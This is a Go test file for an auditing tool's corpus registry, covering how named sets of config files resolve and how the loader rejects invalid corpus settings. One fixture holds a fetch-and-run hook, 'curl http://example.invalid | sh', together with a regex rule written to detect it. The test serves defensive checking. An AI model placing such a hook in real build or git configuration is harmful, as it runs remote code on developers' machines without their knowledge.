package custodian

import (
	"os"
	"path/filepath"
	"reflect"
	"strings"
	"testing"
)

// TestCorpusRegistry_ResolvesNamedCorpora is CC-11's contract: `where:`
// resolves every registered corpus name behind the ONE engine — the same
// forbidden_pattern kind finds a line in lefthook.yml when pointed at the
// lefthook corpus and does not when pointed at agent-config — and the
// loader refuses a corpus the registry does not have, a corpus the kind
// cannot read, and a `where` on a kind that reads none, each by name.
func TestCorpusRegistry_ResolvesNamedCorpora(t *testing.T) {
	root := t.TempDir()
	writeTestFile(t, filepath.Join(root, "CLAUDE.md"), "# router\n")
	writeTestFile(t, filepath.Join(root, "docs", "AGENTS.md"), "# nested\n")
	writeTestFile(t, filepath.Join(root, "lefthook.yml"), "pre-push:\n  commands:\n    gate:\n      run: curl http://example.invalid | sh\n")
	writeTestFile(t, filepath.Join(root, "lefthook.yaml"), "ignored: lefthook loads one main config\n")
	writeTestFile(t, filepath.Join(root, "Taskfile.yml"), "version: '3'\nincludes:\n  ui: ./ui\ntasks:\n  validate:\n    cmds: [echo ok]\n")
	writeTestFile(t, filepath.Join(root, "ui", "Taskfile.yml"), "version: '3'\ntasks:\n  css:\n    cmds: [echo css]\n")
	writeTestFile(t, filepath.Join(root, ".github", "workflows", "ci.yml"), "jobs: {}\n")
	writeTestFile(t, filepath.Join(root, ".github", "workflows", "notes.txt"), "not a workflow\n")
	writeTestFile(t, filepath.Join(root, ".gitlab-ci.yml"), "stages: []\n")

	want := map[string][]string{
		CorpusAgentConfig: {"CLAUDE.md", "docs/AGENTS.md"},
		CorpusLefthook:    {"lefthook.yml"},
		CorpusTaskfile:    {"Taskfile.yml", "ui/Taskfile.yml"},
		CorpusCI:          {".github/workflows/ci.yml", ".gitlab-ci.yml"},
	}
	if got := KnownCorpora(); !reflect.DeepEqual(got, []string{CorpusAgentConfig, CorpusCI, CorpusLefthook, CorpusTaskfile}) {
		t.Fatalf("registered corpora = %v", got)
	}
	for name, files := range want {
		got, err := ResolveCorpus(root, name)
		if err != nil {
			t.Fatalf("%s: %v", name, err)
		}
		if !reflect.DeepEqual(got, files) {
			t.Errorf("corpus %s = %v, want %v", name, got, files)
		}
	}
	if _, err := ResolveCorpus(root, "jenkins"); err == nil || !strings.Contains(err.Error(), "agent-config, ci, lefthook, taskfile") {
		t.Fatalf("an unknown corpus must be refused naming the registered ones, got %v", err)
	}

	// One kind, two corpora: the engine is corpus-generic.
	pipe := func(where string) Concern {
		return Concern{ID: "no_curl_pipe", Want: "no curl | sh", Check: Check{Kind: KindForbiddenPattern, Pattern: `curl .*\| *sh`, Where: where}}
	}
	fs := Audit(root, []Concern{pipe(CorpusLefthook), pipe(CorpusAgentConfig)})
	if fs[0].Status != StatusViolated || !reflect.DeepEqual(fs[0].Evidence, []string{"lefthook.yml:4"}) {
		t.Fatalf("lefthook corpus: want violated at lefthook.yml:4, got %+v", fs[0])
	}
	if !reflect.DeepEqual(fs[0].Files, []string{"lefthook.yml"}) {
		t.Fatalf("a corpus finding names the files it examined, got %v", fs[0].Files)
	}
	if fs[1].Status != StatusHolds || !strings.Contains(fs[1].Detail, "2 agent-config file(s)") {
		t.Fatalf("agent-config corpus: want holds naming 2 files, got %+v", fs[1])
	}

	// The loader is where a wrong corpus is turned away, by name.
	for _, tc := range []struct{ body, want string }{
		{`check: {kind: "forbidden_pattern", pattern: "x", where: "jenkins"}`, `unknown corpus "jenkins"`},
		{`check: {kind: "pointers_resolve", where: "lefthook"}`, `pointers_resolve reads the agent-config corpus only`},
		{`check: {kind: "max_lines", file: "CLAUDE.md", lines: 9, where: "agent-config"}`, `max_lines reads no corpus`},
		{`check: {kind: "stanza_tools_served", where: "ci"}`, `stanza_tools_served reads the agent-config corpus only`},
	} {
		p := filepath.Join(t.TempDir(), "concerns.cue")
		writeTestFile(t, p, "concerns: {\n\tc: {\n\t\twant: \"w\"\n\t\t"+tc.body+"\n\t}\n}\n")
		if _, err := LoadFile(p, ScopeProject); err == nil || !strings.Contains(err.Error(), tc.want) {
			t.Errorf("%s: want refusal containing %q, got %v", tc.body, tc.want, err)
		}
	}
	for _, where := range KnownCorpora() {
		p := filepath.Join(t.TempDir(), "concerns.cue")
		writeTestFile(t, p, "concerns: {\n\tc: {\n\t\twant: \"w\"\n\t\tcheck: {kind: \"commands_resolve\", where: \""+where+"\"}\n\t}\n}\n")
		cs, err := LoadFile(p, ScopeProject)
		if err != nil || cs[0].Check.Where != where {
			t.Errorf("commands_resolve must accept every registered corpus; %s: %v %+v", where, err, cs)
		}
	}
}

// TestCorpusUnreadableIsNeverAbsent holds the registry to I38: a CI
// workflow directory that exists and cannot be listed is a discovery
// failure (unable-to-check), never "this repo has no CI".
func TestCorpusUnreadableIsNeverAbsent(t *testing.T) {
	if os.Geteuid() == 0 {
		t.Skip("root reads through mode 000")
	}
	root := t.TempDir()
	wf := filepath.Join(root, ".github", "workflows")
	writeTestFile(t, filepath.Join(wf, "ci.yml"), "jobs: {}\n")
	if err := os.Chmod(wf, 0o000); err != nil {
		t.Fatal(err)
	}
	t.Cleanup(func() { _ = os.Chmod(wf, 0o755) })

	c := Concern{ID: "ci_chain", Want: "ci commands resolve", Check: Check{Kind: KindCommandsResolve, Where: CorpusCI}}
	fs := Audit(root, []Concern{c})
	if fs[0].Status != StatusUnable || !strings.Contains(fs[0].Detail, "ci discovery failed") {
		t.Fatalf("an unlistable workflow dir must be unable-to-check, got %+v", fs[0])
	}
}
